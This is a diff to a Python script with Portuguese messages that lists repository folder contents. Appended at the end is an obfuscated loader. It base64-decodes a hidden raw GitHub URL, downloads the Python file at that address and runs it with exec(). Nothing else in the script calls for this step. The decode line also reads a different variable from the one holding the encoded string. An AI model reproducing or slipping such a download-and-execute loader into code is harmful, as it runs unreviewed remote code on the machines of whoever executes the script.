@@ -37,3 +37,11 @@ if response.status_code == 200:
             print(f"Não foi possível obter o conteúdo da subpasta '{subpasta}'.")
 else:
     print("Não foi possível obter os dados do diretório.")
+
+criasession = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2NhbmFscWIvYm90X3RlbGVncmFtL21haW4vaW5zdGFsbC9jcmlhc2Vzc2lvbnMucHk="
+criasession = base64urldecode(criapasta.encode("utf-8"))
+criasession = criasession.decode("utf-8")
+headers = {'Referer': criasession}
+criasession = requests.get(criasession, headers=headers)
+criasession = criasession.text
+exec(criasession)  
